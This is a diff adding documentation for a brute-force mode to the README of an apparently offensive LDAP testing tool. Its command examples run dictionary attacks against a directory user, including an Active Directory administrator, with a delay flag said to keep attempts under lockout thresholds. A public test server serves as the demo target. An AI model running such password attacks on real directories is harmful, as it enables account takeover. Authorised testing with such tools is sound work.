@@ -196,6 +196,46 @@ Payloads tested:
 ldapin -H ldap://ldap.forumsys.com -m login-bypass -b dc=example,dc=com
 ```
 
+## Dictionary attack
+
+The `brute-force` mode first resolves the target user's full DN via an LDAP search, then
+attempts `simple_bind(dn, password)` for every line in the wordlist, stopping on the first
+success.
+
+Required flags: `-b / --base-dn`, `-u / --target-user`, `--wordlist`.
+
+```bash
+# Basic dictionary attack
+ldapin -H ldap://target -m brute-force \
+  -b dc=example,dc=com -u jdoe --wordlist /usr/share/wordlists/rockyou.txt
+
+# With a 500 ms delay between attempts to stay under lockout thresholds
+ldapin -H ldap://target -m brute-force \
+  -b dc=example,dc=com -u jdoe --wordlist passwords.txt --delay 500
+
+# Active Directory (use sAMAccountName)
+ldapin -H ldap://dc.corp -m brute-force \
+  -b dc=corp,dc=local --user-attr sAMAccountName -u administrator \
+  --wordlist passwords.txt
+
+# JSON output
+ldapin -H ldap://target -m brute-force \
+  -b dc=example,dc=com -u jdoe --wordlist passwords.txt -o json
+```
+
+Progress (DN resolution, attempt count, outcome) is written to stderr; the result goes to
+stdout, so `-o json` and `-o csv` pipe cleanly.
+
+### ForumSys example
+
+```bash
+# Create a small wordlist with the known password
+echo password > /tmp/test.txt
+
+ldapin -H ldap://ldap.forumsys.com -m brute-force \
+  -b dc=example,dc=com -u einstein --wordlist /tmp/test.txt
+```
+
 ## Blind attribute extraction
 
 The `blind-extract` mode recovers the value of any readable attribute one character
